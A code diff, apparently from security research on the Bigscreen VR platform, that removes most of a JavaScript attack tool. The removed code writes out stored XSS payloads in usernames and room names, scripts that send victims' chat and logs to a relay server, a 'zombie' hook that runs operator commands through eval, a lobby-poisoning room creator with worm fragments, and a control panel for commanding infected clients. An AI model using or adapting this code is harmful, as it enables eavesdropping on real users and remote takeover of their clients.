-let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}e.remove();}});`;
-let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0]&&n[1]&&n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
-let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
-let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
-let makeZombie = `if(!window.sz || window.sz.readyState==3){window.sz=new WebSocket('${relayWebSocketServerUrl}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};};`;
-let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayWebSocketServerUrl}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
-let persistentLogsEavesdropping = `var nl = function(level, args){var sl=new WebSocket('${relayWebSocketServerUrl}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:level,message:args}));sl.close();};}; console.log=function(){nl('console.log',arguments)};Unity.log=function(){nl('Unity.log',arguments)};Unity.logError=function(){nl('Unity.logError',arguments)};`;
-//endregion
-
-let NAME = textName;
-NAME += '<scr'+'ipt>';
-NAME += hideUsernameFromRoomPreview;
-NAME += hideFirstCommaFromRoomPreview;
-NAME += hideUsernameFromRoomParticipants;
-NAME += persistentChatEavesdropping;
-NAME += makeZombie;
-NAME += discoverRoom;
-NAME += persistentLogsEavesdropping;
-NAME += '</sc'+'ript>';
-
-let lobbyPoisoner = null;
-function LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped){
-    // TODO: form fields `worm` and `targetUser` are currently ignored, worm=true, targetUser='Bob'
-    let that = this;
-    this.signalingWs = null;
-    this.onStarted = onStarted;
-    this.onStopped = onStopped;
-    this.state = 'new';
-
-    this.roomId = null;
-    this.roomName = roomName;
-    this.roomDescription = 'Just my own room.';
-    this.attackerIdentity = attackerIdentity;
-
-    this.start = function(){
-        this.state = 'starting';
-        this.createPublicRoom();
-    };
-    this.stop = function(){
-        this.leaveRoom();
-        this.state = 'stopped';
-        this.onStopped();
-        console.info('LobbyPoisoner: Stopped infecting lobby.');
-    };
-
-    this.createPublicRoom = function(){
-        this.signalingWs = new WebSocket(bigscreenSignalUrl);
-        this.signalingWs.binaryType = 'arraybuffer';
-        this.signalingWs.onopen = function (event) {
-            console.debug('LobbyPoisoner connected', event);
-            that.sendSignalingMessage({type: 'register-desktop'});
-            console.debug('LobbyPoisoner registered');
-
-            that.sendSignalingMessage({
-                'type': "room-create",
-                'name': that.roomName,
-                'description': that.roomDescription,
-                'isPrivate': false,
-                'category': "Chat",
-                'creatorName': that.attackerIdentity.name,
-                'creatorUuid': that.attackerIdentity.uuid,
-                'environment': "Cinema",
-                'version': "0.34.0",
-                'size': 12,
-                'roomType': "bigroom"
-              });
-            console.debug('LobbyPoisoner requested to create room');
-        };
-        this.signalingWs.onclose = function (event) {
-            console.debug('LobbyPoisoner onClose disconnected', event);
-        };
-        this.signalingWs.onmessage = function (event) {
-            that.onSignalingMessage(event);
-        };
-        this.signalingWs.onerror = function (event) {
-            console.error('LobbyPoisoner onError event', event);
-        };
-    };
-
-    this.sendSignalingMessage = function(message) {
-        console.debug('sendSignalingMessage', message);
-        this.signalingWs.send(msgpack.encode(message));
-    };
-
-    this.joinRoom = function(){
-        that.sendSignalingMessage({
-          'type': "room-join",
-          'roomId': that.roomId,
-          'name': that.attackerIdentity.name,
-          'uuid': that.attackerIdentity.uuid,
-          'version': unityVersion,
-          'steamId': that.attackerIdentity.steamId,
-          'oculusId': that.attackerIdentity.oculusId
-        });
-        console.debug('LobbyPoisoner requested to join room', that.roomId);
-    };
-
-    this.leaveRoom = function(){
-        this.state = 'leaving';
-        this.sendSignalingMessage({type: "room-leave"});
-        this.signalingWs.close();
-        this.signalingWs = null;
-    };
-
-    this.onSignalingMessage = function(event) {
-        let message = msgpack.decode(new Uint8Array(event.data));
-        console.debug('LobbyPoisoner.onSignalingMessage()', message);
-
-        switch (message.type) {
-            case "room-created":
-                this.roomId = message.roomId;
-                console.info('LobbyPoisoner: room created', this.roomId);
-                this.joinRoom();
-                break;
-
-            case "user-left":
-                console.debug(`LobbyPoisoner: Participant ${message.userId} left room ${this.roomId}.`);
-                break;
-
-            case "user-joined":
-                if(message.uuid === this.attackerIdentity.uuid){
-                    this.attackerIdentity.userId = message.userId;
-                    console.debug('LobbyPoisoner: set attackerIdentity.userId', this.attackerIdentity.userId);
-                    console.debug('LobbyPoisoner: user ready');
-
-                    this.sendSignalingMessage({
-                        type: "user-ready",
-                        roomId: this.roomId,
-                        userId: this.attackerIdentity.userId
-                    });
-
-                    this.state = 'started';
-                    this.onStarted();
-
-                    console.info('LobbyPoisoner: Started infecting lobby.');
-                }
-                else{
-                    console.debug(`LobbyPoisoner: Participant ${message.userId} joined room ${this.roomId}.`);
-                }
-                break;
-
-            case "admin":
-            case "room-latest":
-            case "linkedpc-joined":
-            case "linkedpc-left":
-            case "party-join":
-            case "user-ready":
-            case "room-join-fail":
-            case "room-environment":
-            case "room-private":
-            case "room-public":
-            case "events":
-            case "server-time":
-            case 'ice':
-            case 'offer':
-            case 'answer':
-                console.debug('received message ignored', message);
-                break;
-
-            default:
-                console.error('Unexpected message type (server to client):', message);
-                break;
-        }
-    };
-
-}
-
-infectLobbyForm.addEventListener("submit", function (event) {
-    event.preventDefault();
-    let submitElement = infectLobbyForm.querySelector('input[type=submit]');
-    if (lobbyPoisoner === null) {
-        submitElement.disabled = true;
-        submitElement.classList.add('disabled');
-
-        let roomName = 'My room.';
-        roomName += '<scr'+'ipt>';
-        roomName += `if(NAME==='Bob'){`;
-        //roomName += `function worm(){if(window._infected===undefined){var oldName=NAME;`;
-        roomName += discoverRoom;
-        //roomName += `displayDefaultState = function () { $("#room-id-info") ["hide"](); $("#room-disconnected") ["hide"](); $("#room-leave") ["show"](); $(".user-you .multiplayer-profile-image") ["removeClass"]("") ["addClass"]("profile-photo-sm multiplayer-profile-image " + USER); $(".user-you .user-name") ["text"](oldName); generateFlairs(USER, $(".user-you .flairs"), $(".user-you .user-name")); $("ul#room-participants") ["html"]("") };`;
-        //roomName += `;NAME='<sc'+'ript> '+worm.toString()+' ;worm();</sc'+'ript>'+oldName;Unity.setName(NAME);window._infected=true;}}; worm();`;
-        roomName += '}';
-        roomName += '</sc'+'ript>';
-
-        let onStarted = function () {
-            console.info('LobbyPoisoner: started.');
-            submitElement.value = 'Stop poisoning lobby';
-            submitElement.classList.toggle('btn-danger');
-            submitElement.classList.toggle('btn-success');
-            submitElement.classList.remove('disabled');
-            submitElement.disabled = false;
-        };
-        let onStopped = function () {
-            console.info('LobbyPoisoner: stopped.');
-            submitElement.value = 'Start poisoning lobby';
-            submitElement.classList.toggle('btn-danger');
-            submitElement.classList.toggle('btn-success');
-            submitElement.classList.remove('disabled');
-            submitElement.disabled = false;
-        };
-        let attackerIdentity = new Identity('John46_1', generateBigscreenUuid(), '', '');
-        lobbyPoisoner = new LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped);
-        lobbyPoisoner.start();
-    }
-    else{
-        lobbyPoisoner.stop();
-        lobbyPoisoner = null;
-    }
-});
-
-joinRoomForm.addEventListener("submit", function (event) {
-    event.preventDefault();
-    let roomId = roomIdInput.value;
-
-    if(rooms[roomId]){console.warn('You are already connected to this room.'); return;}
-
-    discoveredRoomsManager.addRoom(roomId);
-
-    let attackerIdentity = new Identity(NAME, generateBigscreenUuid(), '', '');
-    let room = new Room(roomId, attackerIdentity);
-    rooms[roomId] = room;
-    room._load(
-        function(){room.join();},
-        function(){console.error('ERROR', 'Could not load room information')}
-    );
-});
-
-function RoomUI(roomId, room){
-    let that = this;
-    this.room = room;
-    let roomCardTempalte = document.createElement('template');
-    roomCardTempalte.innerHTML =
-        '<div class="card my-3">\n' +
-        '    <div class="card-header">' +
-        '       <span class="roomId"></span>' +
-        '       <div class="dropdown display-inline-block">\n' +
-        '           <button class="btn btn-info dropdown-toggle" type="button" data-toggle="dropdown">' +
-        '               <b class="icon">⚙</b>' +
-        '               Settings' +
-        '           </button>\n' +
-        '           <div class="dropdown-menu">\n' +
-        '               <button class="_lockBigscreen dropdown-item text-white" type="button">\n' +
-        '                   <b class="icon">🔓</b><b>Lock the big screen</b><br/>\n' +
-        '                   Avoid interruptions when watching movies on the big screen.<br/> Prevent users from changing the big screen.\n' +
-        '               </button>\n' +
-        '               <button class="_lockDesktopAudio dropdown-item text-white" type="button">\n' +
-        '                   <b class="icon">🔓</b><b>Lock desktop audio streaming</b><br/>\n' +
-        '                   Prevent anyone from broadcasting a new Desktop Audio stream to the room.\n' +
-        '               </button>\n' +
-        '               <button class="_lockDrawing dropdown-item text-white" type="button">\n' +
-        '                   <b class="icon">🔓</b><b>Lock 3D Drawing markers</b><br/>\n' +
-        '                   Prevent anyone from using 3D markers to draw in your room.\n' +
-        '               </button>\n' +
-        '           </div>\n' +
-        '       </div>' +
-        '       <button class="btn btn-danger _leave" type="button">' +
-        '           <b class="icon">👋</b>' +
-        '           Leave' +
-        '       </button>\n' +
-        '    </div>\n' +
-        '    <div class="card-body">\n' +
-        '        <div class="row">\n' +
-        '            <div class="col-6 col-sm-4">\n' +
-        '                <div class="card">\n' +
-        '                    <div class="card-header"><b class="icon">📧</b>Chat</div>\n' +
-        '                    <div class="card-body chat">\n' +
-        '                    </div>\n' +
-        '                </div>\n' +
-        '            </div>\n' +
-        '            <div class="col-6 col-sm-8">\n' +
-        '                <div class="row"></div>\n' +
-        '            </div>\n' +
-        '      </div>\n' +
-        '  </div>\n' +
-        '</div>';
-    this.roomCardElement = roomCardTempalte.content.firstChild;
-
-    this.lockElements = {
-        lockBigscreenButton: this.roomCardElement.querySelector('._lockBigscreen'),
-        lockDesktopAudioButton:  this.roomCardElement.querySelector('._lockDesktopAudio'),
-        lockDrawingButton: this.roomCardElement.querySelector('._lockDrawing'),
-    };
-    this.lockElements.lockBigscreenButton.addEventListener("click", function (event) {
-        let locks = that.room.locks;
-        locks.lockBigscreen = ! locks.lockBigscreen;
-        that.room.updateLockSettings(locks);
-    });
-    this.lockElements.lockDesktopAudioButton.addEventListener("click", function (event) {
-        let locks = that.room.locks;
-        locks.lockDesktopAudio = ! locks.lockDesktopAudio;
-        that.room.updateLockSettings(locks);
-    });
-    this.lockElements.lockDrawingButton.addEventListener("click", function (event) {
-        let locks = that.room.locks;
-        locks.lockDrawing = ! locks.lockDrawing;
-        that.room.updateLockSettings(locks);
-    });
-
-    this.roomCardElement.querySelector('._leave').addEventListener("click", function (event) {
-        that.room.leave();
-        delete rooms[that.room.roomId];
-    });
-
-    this.roomIdElement = this.roomCardElement.querySelector('.card-header span.roomId');
-    this.roomIdElement.appendChild(document.createTextNode(roomId));
-
-    this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
-    this.participantsElement = this.roomCardElement.querySelector('div div div div.row');
-
-    this.updateLockSettings = function(locks){
-        if(locks.lockBigscreen) {
-            this.lockElements.lockBigscreenButton.classList.remove('bg-danger');
-            this.lockElements.lockBigscreenButton.classList.add('bg-success');
-            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
-            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
-                document.createTextNode('🔒')
-            );
-        }
-        else{
-            this.lockElements.lockBigscreenButton.classList.add('bg-danger');
-            this.lockElements.lockBigscreenButton.classList.remove('bg-success');
-            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
-            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
-                document.createTextNode('🔓')
-            );
-        }
-
-        if(locks.lockDesktopAudio) {
-            this.lockElements.lockDesktopAudioButton.classList.remove('bg-danger');
-            this.lockElements.lockDesktopAudioButton.classList.add('bg-success');
-            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
-            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
-                document.createTextNode('🔒')
-            );
-        }
-        else{
-            this.lockElements.lockDesktopAudioButton.classList.add('bg-danger');
-            this.lockElements.lockDesktopAudioButton.classList.remove('bg-success');
-            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
-            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
-                document.createTextNode('🔓')
-            );
-        }
-
-        if(locks.lockDrawing) {
-            this.lockElements.lockDrawingButton.classList.remove('bg-danger');
-            this.lockElements.lockDrawingButton.classList.add('bg-success');
-            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
-            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
-                document.createTextNode('🔒')
-            );
-        }
-        else{
-            this.lockElements.lockDrawingButton.classList.add('bg-danger');
-            this.lockElements.lockDrawingButton.classList.remove('bg-success');
-            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
-            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
-                document.createTextNode('🔓')
-            );
-        }
-    };
-
-    this.render = function(parentElement){
-        parentElement.appendChild(this.roomCardElement);
-    };
-
-    this.hide = function(){
-        this.roomCardElement.parentNode.removeChild(this.roomCardElement);
-    };
-
-    this.renderChatMessage = function(message, sender, date){
-        let chatMessageTemplate = document.createElement('template');
-        chatMessageTemplate.innerHTML =
-            '<blockquote class="blockquote">\n' +
-            '    <p class="mb-0"></p>\n' +
-            '    <footer class="blockquote-footer"><cite title="Sender"></cite></footer>\n' +
-            '</blockquote>\n';
-        let chatMessageElement = chatMessageTemplate.content.firstChild;
-        chatMessageElement.querySelector('p').appendChild(document.createTextNode(message));
-        chatMessageElement.querySelector('footer cite').appendChild(document.createTextNode(sender));
-        chatMessageElement.querySelector('footer').appendChild(document.createTextNode(' at '+date));
-        this.chatBodyElement.appendChild(chatMessageElement);
-
-        this.chatBodyElement.scrollTop = this.chatBodyElement.scrollHeight;
-    }
-}
-
-/**
- * Room with connection to signalling server and participants.
- */
-function Room(roomId, attackerIdentity){
-    this.attackerIdentity = attackerIdentity;
-
-    this.roomId = roomId;
-    this.name = null;
-    this.description = null;
-    this.private = null;
-    this.size = null;
-    this.createdName = null;
-    this.createdTime = null;
-    this.roomType = null;
-    this.category = null;
-    this.environment = null;
-    this.version = null;
-
-    this.locks = null;
-
-    this.lastUpdated = null;
-
-    this.signalingWs = null;
-
-    this.roomUI = null;
-    this.roomParticipants = {};
-
-    //region Init roomParticipants
-    /*
-     * TODO: Change app's logic so that we could periodicaly update room state and participants without losing
-     * connections.
-     * TODO: We currently do not support dealing with users leaving and joining room. We only support connection to
-     * users who are alredy in the room when we join.
-     */
-    this._initRoomParticipants = function(onSuccess, onError){
-        let that = this;
-        let xhr = new XMLHttpRequest();
-        xhr.overrideMimeType("application/json");
-        xhr.onload = function () {
-            let roomState = JSON.parse(xhr.responseText);
-            let users = [];
-            for(let key in roomState){
-                if(roomState.hasOwnProperty(key) && (key.split('.')[0].substr(0,4) === 'user' )) {
-                    let user = key.split('.')[0];
-                    if(!users.includes(user)){users.push(user);}
-                }
-            }
-            for (let i = 0; i < users.length; i++) {
-                let userId = users[i];
-                let identity = new Identity(
-                    roomState[userId + '.name'],
-                    roomState[userId + '.uuid'],
-                    roomState[userId + '.steam'] ? roomState[userId + '.steam'] : ''
-                );
-                that.roomParticipants[userId] = new RoomParticipant(identity, that, userId);
-            }
-            onSuccess();
-        };
-        xhr.onerror = function () {
-            console.error('ERROR', 'Room.initRoomParticipants()', xhr, that);
-            onError();
-        };
-        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
-        xhr.send();
-    };
-    //endregion
-
-    //region Load room information
-    this._loadRoomInformation = function(onSuccess, onError){
-        let that = this;
-        let xhr = new XMLHttpRequest();
-        xhr.overrideMimeType("application/json");
-        xhr.onload = function () {
-            let roomState = JSON.parse(xhr.responseText);
-
-            that.name = roomState.name;
-            that.description = roomState.description;
-            that.private = roomState.private;
-            that.size = roomState.size;
-            that.createdName = roomState['created.name'];
-            that.createdTime = roomState['created.time'];
-            that.roomType = roomState.roomType;
-            that.category = roomState.category;
-            that.environment = roomState.environment;
-            that.version = roomState.version;
-
-            that.lastUpdated = new Date();
-            onSuccess();
-        };
-        xhr.onerror = function () {
-            console.error('ERROR', 'Room.update()', xhr, that);
-            onError();
-        };
-        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
-        xhr.send();
-    };
-    //endregion
-
-    /**
-     * ASYNC Load room information from server.
-     * Set room's data and create child objects based on retrieved infromation.
-     */
-    this._load = function(onSuccess, onError){
-        let that = this;
-        this._initRoomParticipants(
-            function(){that._loadRoomInformation(onSuccess, onError);},
-            onError
-        );
-    };
-
-    this.sendSignalingMessage = function(message) {
-        console.log('sendSignalingMessage', message);
-        this.signalingWs.send(msgpack.encode(message));
-    };
-
-    this.kickParticipant = function(userId){
-        this.sendSignalingMessage({
-            type: "admin",
-            action: "kick",
-            roomId: this.roomId,
-            targetUser: userId
-        });
-    };
-
-    this.updateLockSettings = function(locks){
-        this.roomUI.updateLockSettings(locks);
-
-        this.sendSignalingMessage({
-          type: 'admin',
-          action: 'lock',
-          roomId: this.roomId,
-          msg: [
-            (locks.lockBigscreen ? '' : 'un') + 'lock-bigscreen',
-            (locks.lockDesktopAudio ? '' : 'un') + 'lock-desktopaudio',
-            (locks.lockDrawing ? '' : 'un') + 'lock-drawing',
-            (locks.lockMicrophones ? '' : 'un') + 'lock-microphones'
-          ]
-        });
-    };
-
-    /**
-     * Join room. Connect to signaling server and establish WebRTC channels
-     * with other room participants.
-     */
-    this.join = function(){
-        let that = this;
-        this.signalingWs = new WebSocket(bigscreenSignalUrl);
-        this.signalingWs.binaryType = 'arraybuffer';
-        this.signalingWs.onopen = function (event) {
-            console.log('connected', event);
-
-            let roomUI = new RoomUI(roomId, that);
-            roomUI.render(roomsElement);
-            that.roomUI = roomUI;
-            for (let userId in that.roomParticipants){
-                if(that.roomParticipants.hasOwnProperty(userId)){
-                    that.roomParticipants[userId].render();
-                }
-            }
-
-            that.sendSignalingMessage({type: 'register-desktop'});
-            console.log('registered');
-
-            that.sendSignalingMessage({
-                'type': "room-join",
-                'roomId': that.roomId,
-                'name': that.attackerIdentity.name,
-                'uuid': that.attackerIdentity.uuid,
-                'version': unityVersion,
-                'steamId': that.attackerIdentity.steamId,
-                'oculusId': that.attackerIdentity.oculusId
-            });
-        };
-        this.signalingWs.onclose = function (event) {
-            console.log('onClose disconnected', event);
-        };
-        this.signalingWs.onmessage = function (event) {
-            that.onSignalingMessage(event);
-        };
-        this.signalingWs.onerror = function (event) {
-            console.log('onError event', event);
-        };
-    };
-
-    this.leave = function(){
-        for (let userId in this.roomParticipants){
-            if(this.roomParticipants.hasOwnProperty(userId)){
-                this.roomParticipants[userId].hide();
-                this.roomParticipants[userId].closeConnections();
-                delete this.roomParticipants[userId];
-            }
-        }
-        this.roomUI.hide();
-        this.sendSignalingMessage({type: "room-leave"});
-        this.signalingWs.close();
-        this.signalingWs = null;
-    };
-
-    this.onSignalingMessage = function(event) {
-        let message = msgpack.decode(new Uint8Array(event.data));
-        console.log('Room.onSignalingMessage()', message);
-
-        switch (message.type) {
-            case "user-left":{
-                this.roomParticipants[message.userId].hide();
-                this.roomParticipants[message.userId].closeConnections();
-                delete this.roomParticipants[message.userId];
-                console.log(`Participant ${message.userId} left room ${this.roomId}.`);
-                break;
-            }
-            case "admin": {
-                if(message.action === 'lock'){
-                    this.locks = {
-                        lockBigscreen: message.msg.includes('lock-bigscreen'),
-                        lockDesktopAudio: message.msg.includes('lock-desktopaudio'),
-                        lockDrawing: message.msg.includes('lock-drawing'),
-                        lockMicrophones: message.msg.includes('lock-microphones'),
-                    };
-                    this.roomUI.updateLockSettings(this.locks);
-                    console.log('updated locks', this.locks);
-                }
-                else{
-                    console.error('unexpected action of message', message);
-                }
-                break;
-            }
-            case "room-latest":
-            case "linkedpc-joined":
-            case "linkedpc-left":
-            case "party-join":
-            case "user-ready":
-            case "room-join-fail":
-            case "room-created":
-            case "room-environment":
-            case "room-private":
-            case "room-public":
-            case "events":
-            case "server-time":
-                console.log('received message ignored', message);
-                break;
-
-            case "user-joined":
-                if(message.uuid === this.attackerIdentity.uuid){
-                    this.attackerIdentity.userId = message.userId;
-                    console.log('set attackerIdentity.userId', this.attackerIdentity.userId);
-                    console.log('user ready');
-
-                    this.sendSignalingMessage({
-                        type: "user-ready",
-                        roomId: this.roomId,
-                        userId: this.attackerIdentity.userId
-                    });
-                }
-                break;
-
-            case 'ice':
-                console.log('onMessage received ICE');
-                console.assert(message.fromDevice === 'desktop', message.fromDevice);
-
-                const candidateStartPos = message.value.indexOf('candidate:');
-                let beforeCandidate  = message.value.slice(0,candidateStartPos);
-                let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
-                let sdpMid = beforeCandidate.slice(
-                    beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
-                    beforeCandidate.indexOf('bigscreen_sdp_mid'));
-                let candidate = new RTCIceCandidate({
-                    sdpMid: sdpMid,
-                    sdpMLineIndex: sdpMLineIndex,
-                    candidate: message.value.slice(candidateStartPos)
-                });
-                {
-                    if( ! this.roomParticipants[message.fromUser]){
-                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC ICE.');
-                        return;
-                    }
-                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
-                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC ICE.');
-                        return;
-                    }
-                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
-                    console.log('ice conn', connection);
-                    connection.rtcPeerConnection.addIceCandidate(candidate);
-                }
-                break;
-            case 'offer':
-                console.log('onMessage received OFFER');
-                console.assert(message.fromDevice === 'desktop', message.fromDevice);
-
-                {
-                    let roomParticipant = this.roomParticipants[message.fromUser];
-                    if( ! roomParticipant){
-                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Offer.');
-                        return;
-                    }
-                    let connection = new Connection(message.SCID, message.PCID, roomParticipant);
-                    roomParticipant.connections[message.PCID] = connection;
-
-                    if (!connection.isInitiator && !connection.isStarted) {
-                        connection.maybeStart();
-                    }
-                    connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
-                        {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
-                    connection.doAnswer();
-                }
-                break;
-            case 'answer':
-                console.error('onMessage received ANSWER');
-
-                console.assert(message.roomId === this.roomId, message.roomId, this.roomId);
-                console.assert(message.targetUser === this.attackerIdentity.userId, message.targetUser, this.attackerIdentity.userId);
-                console.assert(message.fromDevice === 'desktop', message.fromDevice);
-                console.assert(message.targetDevice === 'desktop', message.targetDevice);
-                {
-                    if( ! this.roomParticipants[message.fromUser]){
-                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Answer.');
-                        return;
-                    }
-                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
-                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC SDP Answer.');
-                        return;
-                    }
-                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
-                    if (connection.isStarted) {
-                        connection.setRemoteDescription(new RTCSessionDescription(
-                            {
-                                type: message.type,
-                                sdp: message.value,
-                                scid: connection.scid,
-                                pcid: connection.pcid
-                            }));
-                    }
-                }
-                break;
-            default:
-                console.error('Unexpected message type (server to client):', message);
-                break;
-        }
-    };
-
-
-}
-
-
-////////////////////////////////////////////////
-
-function generateBigscreenUuid() {
-  function bigscreenRand() {
-    return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
-  }
-  return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
-}
-
-/*
-if (location.hostname !== 'localhost') {
-    requestTurn(
-        'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
-    );
-}
-
-function requestTurn(turnURL) {
-    let turnExists = false;
-    for (let i in pcConfig.iceServers) {
-        if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
-            turnExists = true;
-            turnReady = true;
-            break;
-        }
-    }
-    if (!turnExists) {
-        console.log('Getting TURN server from ', turnURL);
-        // No TURN server. Get one from computeengineondemand.appspot.com:
-        let xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-                let turnServer = JSON.parse(xhr.responseText);
-                console.log('Got TURN server: ', turnServer);
-                pcConfig.iceServers.push({
-                    'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
-                    'credential': turnServer.password
-                });
-                turnReady = true;
-            }
-        };
-        xhr.open('GET', turnURL, true);
-        xhr.send();
-    }
-}
-*/
-
-
-
-
-function sendZombieCmd(zombieUuid, cmd){
-    console.debug('sendZombieCmd', zombieUuid, cmd);
-    messageRelayWs.send(JSON.stringify({
-        type: "zombie-cmd",
-        uuid: zombieUuid,
-        cmd: cmd
-    }));
-}
-
-var messageRelayWs = new WebSocket(relayWebSocketServerUrl);
-messageRelayWs.onopen = function(){
-    messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
-};
-messageRelayWs.onmessage = function(event){
-    let message = JSON.parse(event.data);
-    console.log("messageRelayWs received:", message);
-    switch (message.type) {
-        case 'chat': {
-            let date = new Date();
-            if (rooms[message.roomId]) {
-                rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, date);
-            }
-            if (zombiesManager.zombies[message.uuid]) {
-                zombiesManager.zombies[message.uuid].zombieControlUI.renderChatMessage(message.message, message.roomId, date);
-            }
-            break;
-        }
-        case 'log': {
-            if (zombiesManager.zombies[message.uuid]) {
-                zombiesManager.zombies[message.uuid].zombieControlUI.renderLogMessage(message.level, message.message);
-            }
-            break;
-        }
-        case 'room-discovered':
-            discoveredRoomsManager.addRoom(message.roomId);
-            break;
-        case 'zombie-register': {
-            console.log('New zombie:', message.uuid);
-            zombiesManager.addZombie(message.uuid, message.steamId, message.oculusId, message.name);
-
-            let roomRepl = roomRepls[message.uuid];
-            zombiesManager.zombies[message.uuid].repls.push(roomRepl);
-            zombiesManager.zombies[message.uuid].repls.forEach(function(repl) {
-                repl.formElement.addEventListener("submit", function (event) {
-                    event.preventDefault();
-                    let cmd = repl.inputElement.value;
-                    repl.inputElement.value = '';
-                    // render cmd in all repls associated with this zombie (in zombie control and in room)
-                    zombiesManager.zombies[message.uuid].repls.forEach(
-                        function(repl) {repl.renderCmd(cmd);}
-                    );
-                    sendZombieCmd(message.uuid, cmd);
-                });
-            });
-            break;
-        }
-        case 'zombie-result': {
-            console.log('Zombie :', message.uuid, 'Result:', message.result);
-            zombiesManager.zombies[message.uuid].repls.forEach(function(repl){
-                repl.renderResult(message.result);
-            });
-
-            break;
-        }
-        case 'zombie-pong': {
-            zombiesManager.receivedPong(message.uuid);
-            break;
-        }
-        default:
-            console.warn('messageRelayWs unexpected message');
-    }
-};
-
 function Zombie(uuid, steamId, oculusId, name){
     let that = this;
     this.uuid = uuid;
@@ -1676,7 +1556,7 @@ function ZombieControlUI(zombie){
     this.replFormInputElement = that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0];
     this.replFormSubmitElement = that.controlElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[1];
     this.zombie.repls.push(new Repl(
-        that.zombie, // TODO
+        that.zombie, // TODO: Would be better to use Identity here.
         that.controlElement.getElementsByClassName('_repl')[0],
         this.replFormInputElement,
         that.controlElement.getElementsByTagName('pre')[0],
@@ -1904,7 +1784,6 @@ function ZombiesManager(){
         }
     }
 }
-
 
 function ZombiesManagerUI(zombieManager){
     // TODO Maybe dynamically insert html
